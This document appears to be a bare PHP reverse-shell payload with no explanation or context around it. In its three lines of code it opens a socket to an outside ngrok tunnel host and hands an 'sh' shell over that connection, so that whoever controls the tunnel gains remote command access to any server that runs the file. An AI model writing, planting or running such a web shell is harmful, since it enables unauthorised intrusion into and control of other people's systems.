<?php
$sock=fsockopen("0.tcp.ap.ngrok.io",14338);
popen("sh <&3 >&3 2>&3", "r");
?>
